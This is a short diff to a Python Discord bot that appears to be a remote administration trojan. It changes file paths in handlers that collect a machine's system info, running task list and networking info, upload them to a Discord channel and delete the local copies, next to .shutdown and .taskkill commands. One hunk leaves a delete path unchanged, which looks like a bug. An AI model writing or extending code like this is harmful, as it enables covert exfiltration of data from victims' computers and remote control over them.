@@ -136,7 +136,7 @@ async def on_message(message):
         await message.delete()
         await message.channel.send(embed=pc.comp_info()[0])
         await message.channel.send(file=pc.comp_info()[1])
-        os.remove("pc_info.txt")
+        os.remove(f"{main_path}/pc_info.txt")
 
     #SHUTDOWN
     if message.content.startswith(".shutdown"):
@@ -216,8 +216,8 @@ async def on_message(message):
             return
         embed = discord.Embed(title="Tasklist", description="Tasklist fetched.", color=0x00ff00)
         await message.channel.send(embed=embed)
-        await message.channel.send(file=discord.File("tasklist.txt"))
-        os.remove("tasklist.txt")
+        await message.channel.send(file=discord.File(f"{main_path}/tasklist.txt"))
+        os.remove(f"{main_path}/tasklist.txt")
 
     #TASKKILL
     if message.content.startswith(".taskkill"):
@@ -435,7 +435,7 @@ async def on_message(message):
             return
         embed = discord.Embed(title="Networking", description="Networking information fetched.", color=0x00ff00)
         await message.channel.send(embed=embed)
-        await message.channel.send(file=discord.File("networking_info.txt"))
+        await message.channel.send(file=discord.File(f"{main_path}/networking_info.txt"))
         os.remove("networking_info.txt")
 
     #MONITORS
